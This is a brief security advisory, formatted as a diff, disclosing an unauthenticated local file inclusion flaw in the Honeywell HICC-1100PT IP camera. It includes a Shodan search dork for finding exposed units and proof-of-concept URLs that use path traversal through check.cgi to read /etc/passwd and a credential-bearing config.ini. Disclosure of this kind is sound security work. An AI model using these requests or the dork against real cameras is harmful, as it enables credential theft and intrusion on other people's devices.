@@ -1,0 +1,35 @@
+1. Advisory Information
+========================================
+Title                   : Honeywell IP-Camera (HICC-1100PT) Local File Inclusion
+Vendor Homepage         : https://www.asia.security.honeywell.com
+Remotely Exploitable	: Yes
+Tested on Camera types	: HICC-1100PT
+Reference               : https://www.asia.security.honeywell.com/Pages/product.aspx?category=720P-1.3M%20Box%20Camera&cat=HSG-ASIASECURITY&pid=HICC-1100T
+Vulnerability           : Local File Inclusion (Critical/High)
+Shodan Dork             : html:"Honeywell IP-Camera"
+Date                    : 20/08/2016
+Author                  : Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
+
+
+2. CREDIT
+========================================
+This vulnerability was identified during penetration test by Yakir Wizman.
+
+
+3. Description
+========================================
+Honeywell IP-Camera (HICC-1100PT) allows to unauthenticated user to include files from local server such as /etc/passwd, /etc/shadow or config.ini which contains all credentials and other configurations.
+
+4. Proof-of-Concept:
+========================================
+For example you can get /etc/passwd
+http://host:port/cgi-bin/check.cgi?file=../../../etc/passwd
+
+Or config.ini file:
+
+http://host:port/cgi-bin/check.cgi?file=config.ini
+
+
+5. SOLUTION
+========================================
+Contact the vendor for further information regarding the proper mitigation of this vulnerability.
